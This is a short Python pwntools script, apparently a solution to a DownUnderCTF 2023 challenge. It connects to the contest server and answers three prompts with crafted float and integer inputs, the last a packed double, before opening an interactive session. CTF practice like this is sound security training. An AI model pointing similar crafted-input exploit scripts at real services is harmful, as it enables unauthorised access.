# THIS WORKED WE'RE CRAKCED OASJDOADNLKSJAPOMG

from pwn import *

conn = remote('2023.ductf.dev',30024)

conn.recvuntil(b'Give me d: ')
package = b'1.390671161309104e-309'+b'\n'
conn.send(package)

conn.recvuntil(b'Give me s: ')
package = b'1195461702\n'
conn.send(package)

conn.recvuntil(b'Give me f: ')
package = p64(0x3ff9e3779b9486e5)+b'\n'
conn.send(package)

conn.interactive()

conn.recvline()

conn.close()